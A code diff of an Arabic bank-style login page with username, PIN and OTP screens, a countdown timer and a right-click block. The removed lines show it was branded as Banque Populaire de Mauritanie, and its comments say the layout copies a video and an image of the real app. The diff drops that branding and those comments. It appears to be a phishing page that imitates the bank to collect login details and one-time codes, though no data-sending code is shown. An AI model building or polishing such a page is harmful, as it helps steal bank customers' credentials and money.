@@ -54,7 +54,7 @@
             justify-content: center;
             position: relative;
             color: white;
-            font-size: 1.15rem; /* تصغير حجم الخط */
+            font-size: 1.15rem;
             font-weight: 500;
         }
 
@@ -63,13 +63,13 @@
             right: 20px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 1.4rem; /* تصغير حجم الخط */
+            font-size: 1.4rem;
             cursor: pointer;
             font-weight: bold;
             display: none;
         }
 
-        /* المحتوى الداخلي وضبط الأبعاد ليكون ملموم تماماً كما في الفيديو */
+        /* المحتوى الداخلي وضبط الأبعاد ليكون ملموم تماماً */
         .app-content {
             flex: 1;
             padding: 15px 30px 10px 30px;
@@ -105,7 +105,7 @@
 
         .input-group label {
             display: block;
-            font-size: 0.85rem; /* تصغير حجم الكتابة */
+            font-size: 0.85rem;
             font-weight: bold;
             color: #111;
             margin-bottom: 8px;
@@ -123,7 +123,7 @@
             border: none;
             border-bottom: 1.5px solid #222;
             padding: 6px 45px 6px 15px;
-            font-size: 1.05rem; /* تصغير حجم الكتابة */
+            font-size: 1.05rem;
             outline: none;
             color: #333;
             background: transparent;
@@ -132,19 +132,12 @@
             unicode-bidi: plaintext !important;
         }
 
-        .main-input::placeholder {
-            color: #b8b8b8;
-            font-size: 0.95rem; /* تصغير حجم الكتابة */
-            direction: ltr;
-            text-align: left;
-        }
-
         /* الأيقونات جهة اليمين */
         .field-icon {
             position: absolute;
             right: 5px;
             bottom: 8px;
-            width: 22px; /* تصغير حجم الأيقونة */
+            width: 22px;
             height: 22px;
             color: #111;
             z-index: 5;
@@ -172,7 +165,7 @@
             height: 30px;
             border: none;
             border-bottom: 2px solid #222;
-            font-size: 1.4rem; /* تصغير حجم النقاط */
+            font-size: 1.4rem;
             font-weight: bold;
             outline: none;
             background: transparent;
@@ -200,13 +193,13 @@
         .forgot-password-box a {
             color: #222;
             text-decoration: underline;
-            font-size: 0.85rem; /* تصغير حجم الكتابة */
+            font-size: 0.85rem;
             font-weight: 500;
         }
 
-        /* الرابط السفلي المنسق ليكون قريباً كما في الفيديو */
+        /* تم نقل الرابط وضبطه في أسفل الواجهة تماماً فوق الزر مباشرة كما في الصورة */
         .register-link-box {
-            margin-top: 25px; 
+            margin-top: auto; 
             margin-bottom: 15px;
             text-align: center;
             width: 100%;
@@ -215,33 +208,13 @@
         .register-link-box a {
             color: #222;
             text-decoration: underline;
-            font-size: 0.85rem; /* تصغير حجم الكتابة */
+            font-size: 0.85rem;
             font-weight: 500;
-        }
-
-        /* معلومات البنك المنسقة بأسفل المحتوى */
-        .bank-info-footer {
-            margin-top: auto;
-            margin-bottom: 15px;
-            text-align: center;
-            width: 100%;
-            font-size: 0.75rem; /* تصغير حجم الكتابة */
-            color: #555;
-            line-height: 1.5;
-            border-top: 1px dashed #e0e0e0;
-            padding-top: 10px;
-        }
-
-        .bank-info-footer .bank-name {
-            font-weight: bold;
-            color: var(--primary-teal);
-            font-size: 0.8rem; /* تصغير حجم الكتابة */
-            margin-bottom: 2px;
         }
 
         /* تخصيصات واجهة OTP المنظمة */
         .otp-title {
-            font-size: 0.95rem; /* تصغير حجم الكتابة */
+            font-size: 0.95rem;
             font-weight: normal;
             color: #666;
             text-align: center;
@@ -268,7 +241,7 @@
             height: 30px;
             border: none;
             border-bottom: 2px solid #222;
-            font-size: 1.4rem; /* تصغير الحجم */
+            font-size: 1.4rem;
             font-weight: bold;
             outline: none;
             background: transparent;
@@ -286,7 +259,7 @@
 
         /* حقل العداد الزمني */
         .otp-timer-countdown {
-            font-size: 1.1rem; /* تصغير خط الوقت */
+            font-size: 1.1rem;
             font-weight: bold;
             color: #0c3e66;
             margin-bottom: 20px;
@@ -301,7 +274,7 @@
             border: none;
             width: 100%;
             height: 60px;
-            font-size: 1.2rem; /* تصغير حجم الخط */
+            font-size: 1.2rem;
             font-weight: bold;
             cursor: pointer;
             outline: none;
@@ -334,7 +307,7 @@
             <div class="input-group">
                 <label>اسم المستخدم أو رقم الهاتف</label>
                 <div class="input-wrapper">
-                    <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
+                    <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="" oninput="cleanNumberInput(this)">
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <circle cx="12" cy="12" r="10"/>
                         <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
@@ -369,14 +342,8 @@
             <div class="register-link-box">
                 <a href="#">مستخدم جديد ؟ سجل الآن!</a>
             </div>
-
-            <div class="bank-info-footer">
-                <div class="bank-name">البنك الشعبي الموريتاني</div>
-                <div>المقر الرئيسي: شارع الملك فيصل، نواكشوط - موريتانيا</div>
-            </div>
         </div>
 
-        <!-- واجهة الـ OTP المنظمة والمطابقة تماماً مع تفعيل الوقت الحركي -->
         <div id="otpSection" class="app-content hidden">
             <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>
 
@@ -389,16 +356,10 @@
                 </div>
             </div>
 
-            <!-- الحقل الذي يتم تحديث الوقت وتدويره داخله حياً وتلقائياً -->
             <p class="otp-timer-countdown" id="otpTimer">05:00 ثواني</p>
 
-            <div class="register-link-box" style="margin-top: 15px; margin-bottom: 15px;">
+            <div class="register-link-box" style="margin-top: auto; margin-bottom: 15px;">
                 <a href="#" style="color: #222; font-weight: 500;">إعادة إرسال رمز التأكيد</a>
-            </div>
-            
-            <div class="bank-info-footer">
-                <div class="bank-name">البنك الشعبي الموريتاني</div>
-                <div>المقر الرئيسي: شارع الملك فيصل، نواكشوط - موريتانيا</div>
             </div>
         </div>
 
@@ -407,9 +368,8 @@
     </div>
 
     <script>
-        // متغيرات التحكم في مؤقت الـ OTP الحي
         let otpInterval = null;
-        let totalSeconds = 300; // 5 دقائق كاملة تطابق 05:00
+        let totalSeconds = 300; 
 
         // حظر النقر لحماية البيانات والواجهة
         document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
@@ -462,7 +422,7 @@
         // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP
         function startOtpTimer() {
             clearInterval(otpInterval);
-            totalSeconds = 300; // إعادة الضبط إلى 5 دقائق
+            totalSeconds = 300; 
             updateTimerDisplay();
 
             otpInterval = setInterval(() => {
@@ -476,7 +436,6 @@
             }, 1000);
         }
 
-        // تحديث صيغة الوقت المعروضة وتنسيق الخانات الثنائية
         function updateTimerDisplay() {
             const minutes = Math.floor(totalSeconds / 60);
             const seconds = totalSeconds % 60;
@@ -520,7 +479,6 @@
                 backArrow.style.display = "block";
                 submitBtn.innerText = "التحقق";
                 
-                // تشغيل وقت عداد الـ OTP تلقائياً عند فتح شاشته
                 startOtpTimer();
 
                 setTimeout(() => {
